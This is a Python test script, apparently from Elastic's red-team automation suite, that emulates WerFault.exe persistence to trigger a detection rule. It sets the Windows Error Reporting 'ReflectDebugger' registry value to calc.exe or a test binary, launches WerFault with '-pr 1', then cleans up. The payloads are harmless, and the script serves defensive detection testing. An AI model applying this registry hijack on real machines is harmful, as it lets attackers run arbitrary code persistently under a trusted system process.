# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: WerFault.exe Persistence
# RTA: werfault_persistence.py
# signal.rule.name: Process Potentially Masquerading as WerFault
# ATT&CK: T1112
# Description: Sets an executable to run when WerFault is run with -rp flags and runs it

import logging
import time

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


MY_APP_EXE = "bin/myapp.exe"


@register_code_rta(
    id="cbd90dde-02f4-4010-b654-ccabff3c3c73",
    name="werfault_persistence",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[RuleMetadata(id="ac5012b8-8da8-440b-aaaf-aedafdea2dff", name="Suspicious WerFault Child Process")],
    techniques=["T1036"],
    ancillary_files=[MY_APP_EXE],
)
def main():
    reg_key = "'HKLM:\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\hangs'"
    reg_name = "ReflectDebugger"

    commands = ["C:\\Windows\\system32\\calc.exe", "'powershell -c calc.exe'", MY_APP_EXE]

    for command in commands:
        log.info(f"Setting WerFault reg key to `{command}`")
        _ = _common.execute_command(
            [
                "powershell",
                "-c",
                "New-ItemProperty",
                "-Path",
                reg_key,
                "-Name",
                reg_name,
                "-Value",
                command,
            ],
        )
        time.sleep(1)

        log.info("Running WerFault.exe -pr 1")
        _ = _common.execute_command(["werfault", "-pr", "1"])
        time.sleep(2.5)

        _ = _common.execute_command(
            [
                "powershell",
                "-c",
                "Remove-ItemProperty",
                "-Path",
                reg_key,
                "-Name",
                reg_name,
            ]
        )

    log.info("Cleaning up")

    _ = _common.execute_command(["taskkill", "/F", "/im", "calc.exe"])
    _ = _common.execute_command(["taskkill", "/F", "/im", "calculator.exe"])
    _ = _common.execute_command(["taskkill", "/F", "/im", "myapp.exe"])
